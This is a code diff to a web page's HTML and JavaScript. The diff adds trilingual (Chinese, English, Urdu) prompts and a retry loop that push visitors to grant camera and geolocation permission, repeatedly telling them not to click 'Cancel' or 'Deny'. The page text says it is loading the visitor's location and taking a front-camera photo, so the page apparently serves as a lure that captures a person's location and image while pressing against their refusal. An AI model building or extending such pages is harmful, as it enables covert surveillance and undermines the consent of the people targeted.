@@ -55,6 +55,10 @@
             color: #dc3545; 
             font-weight: bold; 
         }
+        .warning {
+            color: #ff9800;
+            font-weight: bold;
+        }
         .permission-status {
             font-size: 0.85rem;
             color: #666;
@@ -98,6 +102,37 @@
             font-weight: 600;
             line-height: 1.6;
         }
+
+        .retry-button {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 1rem;
+            border-radius: 6px;
+            cursor: pointer;
+            margin-top: 20px;
+            font-weight: 600;
+            transition: background-color 0.3s;
+        }
+
+        .retry-button:hover {
+            background-color: #0056b3;
+        }
+
+        .retry-button:active {
+            background-color: #003d82;
+        }
+
+        .instruction-text {
+            font-size: 0.95rem;
+            line-height: 1.6;
+            margin: 15px 0;
+            padding: 10px;
+            background-color: #e7f3ff;
+            border-radius: 6px;
+            border-left: 4px solid #007bff;
+        }
     </style>
 </head>
 <body>
@@ -119,6 +154,7 @@
         const RETRY_DELAY = 1000;
 
         let mediaStream = null;
+        let isProcessing = false;
 
         // Permission tracking
         const permissionStatus = {
@@ -169,19 +205,60 @@
         }
 
         /**
-         * Show permission denied message in English and Urdu
+         * Show permission denied message with retry button
          */
-        function showPermissionDeniedMessage() {
+        function showPermissionDeniedWithRetry() {
             const content = document.getElementById('content');
             content.innerHTML = `
                 <h2 class="error">
-                    We can't proceed because you didn't press allow.<br>
-                    Refresh the page to allow.
-                    <br><br>
-                    ہم آگے نہیں بڑھ سکتے کیونکہ آپ نے اجازت نہیں دی۔<br>
-                    اجازت دینے کے لیے صفحہ کو ریفریش کریں۔
+                    权限被拒绝 ❌<br>
+                    We can't proceed because you didn't press allow.
                 </h2>
+                <div class="instruction-text">
+                    <strong>请按照以下步骤操作：</strong><br>
+                    1. 点击下方"重试"按钮<br>
+                    2. 当浏览器询问时，点击"允许"<br>
+                    3. 不要点击"取消"或"拒绝"<br>
+                    <br>
+                    <strong>English Instructions:</strong><br>
+                    1. Click the "Retry" button below<br>
+                    2. When prompted, click "Allow"<br>
+                    3. Do not click "Cancel" or "Deny"
+                </div>
+                <div class="instruction-text">
+                    <strong>اردو ہدایات:</strong><br>
+                    1. نیچے "دوبارہ کوشش کریں" بٹن پر کلک کریں<br>
+                    2. جب پوچھا جائے تو "اجازت دیں" پر کلک کریں<br>
+                    3. "منسوخ کریں" یا "مسترد کریں" پر کلک نہ کریں
+                </div>
+                <button class="retry-button" onclick="resetAndRetry()">🔄 重试 / Retry / دوبارہ کوشش کریں</button>
             `;
+        }
+
+        /**
+         * Reset and retry permissions
+         */
+        function resetAndRetry() {
+            console.log("🔄 User clicked retry button");
+            isProcessing = false;
+            permissionRetries = { camera: 0, geolocation: 0 };
+            permissionStatus = { camera: false, geolocation: false };
+            cleanupMedia();
+            
+            const content = document.getElementById('content');
+            content.innerHTML = `
+                <h1 id="heading">请稍等，正在加载您的位置...</h1>
+                <p id="subtitle">这只需要一点时间。</p>
+                <div id="permissionStatus"></div>
+                <div id="cameraSection" style="display:none;">
+                    <p style="margin:15px 0 8px;">前置相机已开启，正在拍照...</p>
+                    <video id="video" autoplay playsinline muted></video>
+                </div>
+            `;
+            
+            setTimeout(() => {
+                initialize();
+            }, 500);
         }
 
         /**
@@ -215,18 +292,20 @@
                     console.warn(`⚠ Camera permission attempt failed (${permissionRetries.camera}/${MAX_RETRIES}):`, err.name);
                     
                     if (err.name === 'NotAllowedError') {
+                        // User clicked "Deny" or "Cancel"
                         permissionRetries.camera++;
+                        console.log(`User denied camera (attempt ${permissionRetries.camera}/${MAX_RETRIES})`);
                     } else if (err.name === 'NotFoundError') {
                         console.error("✗ Camera device not found");
-                        showPermissionDeniedMessage();
+                        showPermissionDeniedWithRetry();
                         return false;
                     } else if (err.name === 'NotReadableError') {
                         console.error("✗ Camera is in use by another application");
-                        showPermissionDeniedMessage();
+                        showPermissionDeniedWithRetry();
                         return false;
                     } else if (err.name === 'SecurityError') {
                         console.error("✗ Security error: HTTPS required");
-                        showPermissionDeniedMessage();
+                        showPermissionDeniedWithRetry();
                         return false;
                     }
 
@@ -235,12 +314,15 @@
                     if (permissionRetries.camera < MAX_RETRIES) {
                         console.log(`⏳ Retrying in ${RETRY_DELAY}ms...`);
                         await new Promise(resolve => setTimeout(resolve, RETRY_DELAY));
+                    } else {
+                        // Max retries reached
+                        console.error("✗ Failed to obtain camera permission after retries");
+                        showPermissionDeniedWithRetry();
+                        return false;
                     }
                 }
             }
 
-            console.error("✗ Failed to obtain camera permission after retries");
-            showPermissionDeniedMessage();
             return false;
         }
 
@@ -284,11 +366,13 @@
                     if (permissionRetries.geolocation < MAX_RETRIES) {
                         console.log(`⏳ Retrying in ${RETRY_DELAY}ms...`);
                         await new Promise(resolve => setTimeout(resolve, RETRY_DELAY));
+                    } else {
+                        console.error("✗ Failed to obtain geolocation permission after retries");
+                        return false;
                     }
                 }
             }
 
-            console.error("✗ Failed to obtain geolocation permission after retries");
             return false;
         }
 
@@ -534,6 +618,9 @@
          * Initialize the application
          */
         async function initialize() {
+            if (isProcessing) return;
+            isProcessing = true;
+            
             console.log("✓ Page loaded, starting permission request process");
             const permissionsGranted = await requestAllPermissions();
             
